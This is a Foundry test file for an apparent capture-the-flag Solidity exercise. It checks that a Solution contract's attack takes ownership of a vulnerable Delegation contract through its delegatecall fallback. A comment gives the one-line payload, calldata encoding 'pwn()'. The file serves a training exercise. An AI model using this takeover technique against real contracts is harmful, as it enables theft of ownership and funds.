// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

import "./Solution.sol";
import "./Delegate.sol";

contract Test_solution is Test {
    Delegate _delegate;
    Delegation _delegation;
    Solution _solution;
    address player = makeAddr("player");
    address _owner = makeAddr("owner");

    function setUp() public {
        Delegate new_delegate = new Delegate(_owner);
        Delegation new_delegation = new Delegation(address(new_delegate));
        Solution new_solution = new Solution();

        _delegate = Delegate(new_delegate);
        _delegation = Delegation(new_delegation);
        _solution = Solution(new_solution);

        vm.deal(player, 1 ether);
    }

    function test_delegation() public {
        vm.startPrank(player);
        console.log("initial owner", _delegation.owner());
        _solution.attack(address(_delegation));

        assertEq(_delegation.owner(), address(_solution)); // instead of using an contract send transaction from your address with `data = abi.encodeWithSignature("pwn()");`
    }
}
